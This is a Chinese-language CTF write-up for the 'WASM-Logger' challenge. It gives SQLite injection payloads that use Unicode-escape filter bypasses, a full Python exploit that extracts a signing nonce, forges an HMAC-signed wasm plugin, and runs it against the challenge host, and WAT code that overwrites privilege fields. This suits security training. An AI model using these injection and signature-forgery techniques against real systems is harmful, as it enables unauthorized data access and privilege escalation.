# WASM-Logger

## Flag

`flag{15c3710e-09d4-42f7-9fe1-e7dd517fb8bf}`

## 题目分析

首页有两个关键入口：

- `/admin-console`
- `/static/backup/plugin-note.txt.bak`

后台页面能看出一共有三块功能：

1. 导入日志模板 `/api/v2/templates/import`
2. 预览模板 `/api/v2/templates/{id}/preview`
3. 上传并执行 wasm 插件

备份文件给了后半段利用链的核心信息：

```text
func deriveSigningKey(version, installNonce string) string {
    sum := sha256.Sum256([]byte("gl.v5:module:derive|" + version + "|" + installNonce))
    return hex.EncodeToString(sum[:])
}

signature = HMAC-SHA256(真正的签名密钥, wasm 原始字节)
```

以及 wasm 运行时可用的三个导入函数：

```text
env.__write(idx, val)
env.__set_used(n)
env.__rebind_window(off, n)
```

最后权限检查为：

```go
used := int(memCtx.Used)
if used > len(memCtx.Scratch) {
    used = len(memCtx.Scratch)
}
expect := crc32.ChecksumIEEE(memCtx.Scratch[:used])

if memCtx.Armed == 1 && memCtx.Role == 0xA11CE && memCtx.Gate == expect {
    返回正式权限
}
```

说明最终目标是：

- 拿到真正的插件签名 key
- 上传合法 wasm
- 通过 wasm 修改 `RuntimeCtx`

## 模板接口注入点

普通探测时可以发现：

- `field` 有白名单，只允许 `type/priority/tags/sensor/zone`
- `group_by` 也会做字符检查
- 但模板是按 `raw` 原样保存的

这里有一个关键差异：

- 导入阶段对原始 JSON 文本做校验
- 预览阶段再把 JSON 解码后使用

因此可以把被禁字符写成 `\uXXXX` 逃过校验，比如：

```json
{"name":"esc","field":"type","group_by":"\u0027"}
```

导入能成功，而预览时真正生效的 `group_by` 已经变成了 `'`。

继续测试 rollup 统计接口可以确认这里是 SQLite 注入，下面这个 payload 会把返回的 `count` 直接改成任意整数：

```text
x\u0027) IS NOT NULL UNION SELECT 123 ORDER BY 1 DESC LIMIT 1 -- 
```

返回：

```json
{"count":123,"mode":"rollup-count","status":"ok"}
```

说明 `count` 字段本身就是一个非常稳定的整数回显通道。

## 读数据库拿 install_nonce

先枚举表：

```sql
SELECT group_concat(name, ',')
FROM (SELECT name FROM sqlite_master WHERE type='table' ORDER BY name)
```

得到：

```text
gl_audit,gl_runtime,gl_templates,logs,sqlite_sequence
```

再枚举 `gl_runtime` 表结构：

```sql
SELECT group_concat(name||':'||type, ',')
FROM pragma_table_info('gl_runtime')
```

得到：

```text
id:INTEGER,scope:TEXT,install_nonce:TEXT,build_tag:TEXT,created_at:INTEGER
```

最后读取运行时配置：

```sql
SELECT group_concat(scope||':'||install_nonce||':'||build_tag, ',')
FROM gl_runtime
```

结果为：

```text
plugin-signer:46c6343b64da:r5.2.17-ops
```

于是拿到：

- `install_nonce = 46c6343b64da`
- `version = r5.2.17-ops`

## 推导签名 key

根据备份里的公式：

```python
import hashlib

version = "r5.2.17-ops"
nonce = "46c6343b64da"
key = hashlib.sha256(
    f"gl.v5:module:derive|{version}|{nonce}".encode()
).hexdigest()
print(key)
```

得到：

```text
9be5d405b5da869f5daf8a17869f2b44e425144c88701addf4c4539a1d159305
```

上传时再用这个十六进制字符串作为 HMAC key，对 wasm 原始字节做 `HMAC-SHA256` 即可通过校验。

## wasm 利用思路

备份里给出的结构体是：

```go
type RuntimeCtx struct {
    Scratch [64]byte
    Used    uint16
    Class   uint8
    Role    uint32
    Gate    uint32
    Armed   uint8
    Window  []byte
}
```

初始可写窗口只有 `Scratch[:8]`，但旧兼容逻辑允许：

```text
env.__rebind_window(off, n)
```

直接把窗口重绑定到 `Scratch` 后面的内存。

这里最省事的做法是：

1. `rebind_window(64, 13)`，把窗口指到 `Used/Class/Role/Gate/Armed`
2. 把 `Used` 写成 `0`
3. 把 `Role` 写成 `0x000A11CE`
4. 把 `Gate` 写成 `0`
5. 把 `Armed` 写成 `1`

因为：

- `used = 0`
- `crc32(Scratch[:0]) = 0`
- 所以 `expect = 0`

最终条件就变成：

```text
Armed == 1
Role  == 0xA11CE
Gate  == 0
```

全部都能直接用 wasm 写出来。

## 最终 exp

下面脚本把整条链串起来：先用模板注入读 `install_nonce`，再生成签名并上传恶意 wasm，最后执行拿 flag。

```python
import hashlib
import hmac
import requests
import wasmtime

requests.packages.urllib3.disable_warnings()

BASE = "https://eci-2zed3x9qvp0tuvjruh65.cloudeci1.ichunqiu.com:8080"
VERSION = "r5.2.17-ops"


def enc(s: str) -> str:
    out = []
    for ch in s:
        if ch.isalnum() or ch == "_":
            out.append(ch)
        else:
            out.append(f"\\u{ord(ch):04x}")
    return "".join(out)


def qint(expr: str) -> int:
    inj = f"x') IS NOT NULL UNION SELECT ({expr}) ORDER BY 1 DESC LIMIT 1 -- "
    raw = '{"name":"probe","field":"type","group_by":"' + enc(inj) + '"}'
    r = requests.post(
        BASE + "/api/v2/templates/import",
        data=raw.encode(),
        headers={"Content-Type": "application/json"},
        verify=False,
        timeout=10,
    )
    tid = r.json()["id"]
    j = requests.get(
        BASE + f"/api/v2/templates/{tid}/preview?view=rollup",
        verify=False,
        timeout=10,
    ).json()
    return j["count"]


def qstr(expr: str) -> str:
    length = qint(f"length(({expr}))")
    out = []
    for i in range(1, length + 1):
        code = qint(f"unicode(substr(({expr}),{i},1))")
        out.append(chr(code))
    return "".join(out)


nonce = qstr(
    "SELECT install_nonce FROM gl_runtime "
    "WHERE scope='plugin-signer' ORDER BY id DESC LIMIT 1"
)

key = hashlib.sha256(
    f"gl.v5:module:derive|{VERSION}|{nonce}".encode()
).hexdigest().encode()

wat = r'''
(module
  (import "env" "__write" (func $write (param i32 i32)))
  (import "env" "__set_used" (func $set_used (param i32)))
  (import "env" "__rebind_window" (func $rebind (param i32 i32)))

  (func $main
    i32.const 64
    i32.const 13
    call $rebind

    ;; Used = 0
    i32.const 0
    i32.const 0
    call $write
    i32.const 1
    i32.const 0
    call $write

    ;; padding/Class
    i32.const 2
    i32.const 0
    call $write
    i32.const 3
    i32.const 0
    call $write

    ;; Role = 0x000A11CE
    i32.const 4
    i32.const 206
    call $write
    i32.const 5
    i32.const 17
    call $write
    i32.const 6
    i32.const 10
    call $write
    i32.const 7
    i32.const 0
    call $write

    ;; Gate = 0
    i32.const 8
    i32.const 0
    call $write
    i32.const 9
    i32.const 0
    call $write
    i32.const 10
    i32.const 0
    call $write
    i32.const 11
    i32.const 0
    call $write

    ;; Armed = 1
    i32.const 12
    i32.const 1
    call $write
  )

  (start $main)
  (export "run" (func $main))
  (export "_start" (func $main))
  (export "main" (func $main))
  (export "execute" (func $main))
)
'''

wasm = bytes(wasmtime.wat2wasm(wat))
sig = hmac.new(key, wasm, hashlib.sha256).hexdigest()

print(requests.post(
    BASE + "/api/v2/plugins/upload",
    headers={"X-Plugin-Signature": sig},
    data=wasm,
    verify=False,
    timeout=15,
).text)

print(requests.post(
    BASE + "/api/v2/plugins/execute",
    verify=False,
    timeout=15,
).text)
```

执行后返回：

```text
Here is my flag for you:
flag{15c3710e-09d4-42f7-9fe1-e7dd517fb8bf}
When I learn it well, I will pass on this persistence to you too.
```

## 总结

这题实际是两段漏洞拼接：

1. `group_by` 的 Unicode 转义绕过，进入 SQLite `UNION SELECT`
2. 拿到 `install_nonce` 后伪造合法 wasm 签名，再利用 `__rebind_window` 越过最初的 8 字节窗口限制，直接修改权限检查所需状态

前半段负责拿 key，后半段负责提权，组合起来就能稳定拿到 flag。
